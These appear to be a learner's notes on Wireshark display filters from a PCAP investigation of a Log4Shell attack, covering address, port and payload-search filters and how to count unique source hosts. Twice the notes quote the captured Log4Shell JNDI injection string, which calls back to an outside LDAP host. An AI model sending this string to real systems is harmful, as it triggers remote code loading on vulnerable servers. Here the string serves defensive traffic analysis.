# Wireshark Filters and Analysis Notes - Day 32

## Purpose
This document records the filters practiced during the PCAP investigation.
The focus is understanding what each component means.
The goal is to build filters during investigations rather than memorize commands.

## IP Address
```text
ip.addr == 192.168.1.10
```
`ip` refers to the IP layer.
`addr` means address.
`==` means equals.
The filter matches packets where the address is source or destination.

## Source IP
```text
ip.src == X
```
`src` means source.
The filter identifies packets sent from X.
It is useful when direction matters.

## Destination IP
```text
ip.dst == X
```
`dst` means destination.
The filter identifies packets sent to X.
It is useful for identifying traffic directed at a host.

## TCP Port
```text
tcp.port == 80
```
`tcp` refers to TCP.
`port` refers to source or destination port.
The filter matches TCP traffic involving port 80.

## TCP Destination Port
```text
tcp.dstport == 80
```
`dstport` means destination port.
The filter matches TCP packets going to port 80.
It is more specific than `tcp.port == 80`.

## TCP Source Port
```text
tcp.srcport == 80
```
`srcport` means source port.
The filter matches TCP packets originating from port 80.

## TCP Payload Search
```text
tcp contains "string"
```
`contains` searches packet content.
The filter can find strings inside TCP payload data.
It was useful during the Log4Shell investigation.

## Two-Host Filter
```text
ip.addr == X && ip.addr == Y
```
`&&` means logical AND.
Both conditions must be satisfied.
The filter can isolate traffic involving two specified hosts.

## Payload Versus Header
An IP address can appear inside HTTP data.
That does not make it the packet's IP-layer destination.
For example:
`${jndi:ldap://31.131.16.127:1389/Exploit}`
contains an IP address inside application data.

## Correct Payload Filter
```text
tcp contains "31.131.16.127"
```
This searches TCP payload content.
It can find the callback address inside the HTTP request.
This was appropriate for the PCAP.

## Why IP Filtering Can Fail
```text
ip.addr == 31.131.16.127
```
This searches the IP header.
If the address exists only in the payload, no packet may match.
The filter must match the location of the evidence.

## Log4Shell Pattern
The observed payload was:
`${jndi:ldap://31.131.16.127:1389/Exploit}`
The important pattern was:
`${jndi:ldap://`
The callback used LDAP port 1389.

## Counting Packets
Wireshark displays the number of packets matching a filter.
That number is not automatically the number of unique IP addresses.
A single source can generate many packets.

## Counting Unique IPs
Apply the relevant filter.
Inspect the Source column.
Record the source values.
Remove duplicate values.
Count the remaining unique addresses.

## Example
The relevant filtered traffic showed:
`46.105.95.220`
`104.248.144.120`
The unique source count was therefore 2.

## Filter Selection Method
Start with the investigation question.
Identify the protocol.
Determine whether the value is an address, port, or content.
Determine whether direction matters.
Choose a filter matching the evidence location.
Inspect the result manually.
Validate the packet details.

## Useful Patterns
```text
ip.addr == X
```
Single-host traffic.

```text
ip.src == X
```
Traffic from X.

```text
ip.dst == X
```
Traffic to X.

```text
tcp.port == 80
```
TCP traffic involving port 80.

```text
tcp.dstport == 80
```
TCP traffic to port 80.

```text
tcp contains "X"
```
TCP payload search.

## Common Mistakes
Using `ip.addr` to search payload content.
Confusing source and destination.
Counting packets instead of unique hosts.
Ignoring protocol context.
Trusting only the summary columns.
Failing to inspect the request URI.
Assuming every port is malicious.
Blocking an IOC without validation.

## SOC Application
